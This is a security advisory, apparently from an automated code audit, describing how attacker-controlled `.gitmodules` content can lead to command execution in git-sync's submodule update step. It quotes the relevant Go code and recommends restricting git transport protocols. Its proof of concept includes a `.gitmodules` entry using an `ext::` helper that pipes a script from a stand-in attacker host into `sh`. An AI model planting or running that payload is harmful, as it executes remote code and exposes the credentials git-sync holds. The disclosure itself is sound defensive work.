### Title
Attacker-controlled `.gitmodules` reaches unrestricted `git submodule update --init` and can trigger command execution via unsafe transport helpers - (File: main.go)

### Summary
The reported Router bug is a class of "attack surface reached in the middle of a trusted execution flow" — the executor keeps running attacker-influenced steps (transfers, approvals) without validating that the addresses/commands reached mid-flow are safe. In `git-sync`, the closest reachable analog is `configureWorktree`, which, after checking out attacker-supplied (fetched) commit content, unconditionally runs `git submodule update --init` (optionally `--recursive`) against whatever `.gitmodules` content was just pulled from the remote, with no restriction on submodule URL transports (e.g. no `protocol.allow`/`GIT_ALLOW_PROTOCOL` hardening is configured anywhere in the codebase).

### Finding Description
`git-sync` fetches a remote ref and checks it out into a worktree, then calls `configureWorktree`, which — when `--submodules` is not `off` — runs: [1](#0-0) 

This command set is built purely from the `git.submodules` mode and `git.depth`; it does not sanitize or restrict what `.gitmodules` in the synced repo may specify. Git itself supports transport helpers such as `ext::<command>` for submodule/remote URLs, which execute an arbitrary shell command when git attempts to fetch that "remote." Because `.gitmodules` is ordinary tracked file content, whoever can push a commit that `git-sync` will fetch (the same "attacker-pushed commit" trust boundary as the rest of this scan) fully controls the URL passed to `git submodule update --init`.

Nowhere in the git-sync configuration path — `SetupDefaultGitConfigs`, `SetupExtraGitConfigs`, `SetupGitSSH`, `SetupCookieFile` — is `protocol.ext.allow`, `protocol.allow`, or `GIT_ALLOW_PROTOCOL` set to restrict transport helpers: [2](#0-1) 

This mirrors the Router report's core defect: execution reaches attacker-influenced data (a URL/command in `.gitmodules`) in the middle of an otherwise trusted flow (`SyncRepo` → `createWorktree`/`configureWorktree`), and there is no allowlist restricting what that data is permitted to do — exactly the "whitelist of addresses/commands allowed to reenter" remediation recommended in the original report.

### Impact Explanation
If reachable, this results in arbitrary command execution on the git-sync sidecar as the process's UID, which can read/exfiltrate any credentials the sidecar holds (`--username`/`--password-file`, SSH keys via `SetupGitSSH`, cookie files via `SetupCookieFile`, or GitHub App tokens), write/delete files outside `--root`, or otherwise fully compromise the pod — a strictly worse outcome than the original Router token-theft report.

### Likelihood Explanation
Likelihood is **low-to-uncertain** for the same reason the original report rates likelihood "low": several conditions must hold simultaneously —
1. `--submodules` must not be `off` (git-sync's flag default was not confirmed from available context; I could not fully verify the compiled-in default value with the tools available).
2. Modern versions of Git itself increasingly restrict `ext::`/unsafe submodule URLs by default (`protectSubmodule` / `submodule.<name>.update = !cmd` and `ext::` transports have received upstream hardening in recent Git releases), so the practical exploitability depends on the Git binary version bundled/used at runtime, which this repo does not pin or restrict via config.
3. The attacker must be able to get a malicious commit fetched by git-sync (i.e., control of, or write access to, the configured `--repo`/ref), same precondition as "execution reaching a malicious address" in the original report.

I could not confirm from the indexed code whether the container images used with this git-sync build (Dockerfile / vendored Git version) already restrict `ext::` and other unsafe protocols by default, so I cannot assert this is unconditionally exploitable — only that git-sync's own configuration layer adds no such restriction.

### Recommendation
- Set `protocol.ext.allow=never` (and `protocol.file.allow=user`/`never` as appropriate) via `SetupDefaultGitConfigs` for all git invocations, so untrusted `.gitmodules` content cannot invoke arbitrary transport helpers.
- Alternatively/additionally, export `GIT_ALLOW_PROTOCOL=file:git:http:https:ssh` (excluding `ext`) for every `git.Run` invocation, not just an opt-in flag.
- Document and enforce a minimum bundled Git version known to mandate `protectSubmodule` protections, since this defense is currently entirely dependent on upstream Git defaults rather than git-sync's own configuration.

### Proof of Concept
1. Attacker with push access (or MITM/compromise of the configured `--repo`) adds `.gitmodules`:
   ```
   [submodule "pwn"]
       path = pwn
       url = ext::sh -c "curl -s https://attacker.example/x | sh; exit 1"
   ```
2. Attacker commits and the ref is fetched by git-sync (`git.fetch` in `SyncRepo`) [3](#0-2) .
3. `configureWorktree` checks out the new hash and then runs `git submodule update --init` [4](#0-3) , causing Git to invoke the `ext::` helper and execute the attacker's shell command as the git-sync process, unless the local Git binary's own protections block it (unverified from repo context).

### Citations

**File:** main.go (L1727-1747)
```go
	// Reset the worktree's working copy to the specific ref.
	git.log.V(1).Info("setting worktree HEAD", "hash", hash)
	if _, _, err := git.Run(ctx, worktree.Path(), "reset", "--hard", hash, "--"); err != nil {
		return err
	}

	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
	}
```

**File:** main.go (L1885-1887)
```go
	if err := git.fetch(ctx, git.ref); err != nil {
		return false, "", err
	}
```

**File:** main.go (L2276-2303)
```go
// SetupDefaultGitConfigs configures the global git environment with some
// default settings that we need.
func (git *repoSync) SetupDefaultGitConfigs(ctx context.Context) error {
	configs := []keyVal{{
		// Never auto-detach GC runs.
		key: "gc.autoDetach",
		val: "false",
	}, {
		// Fairly aggressive GC.
		key: "gc.pruneExpire",
		val: "now",
	}, {
		// How to manage credentials (for those modes that need it).
		key: "credential.helper",
		val: "cache --timeout 3600",
	}, {
		// Never prompt for a password.
		key: "core.askPass",
		val: "true",
	}}

	for _, kv := range configs {
		if _, _, err := git.Run(ctx, "", "config", "--global", kv.key, kv.val); err != nil {
			return fmt.Errorf("error configuring git %q %q: %w", kv.key, kv.val, err)
		}
	}
	return nil
}
```
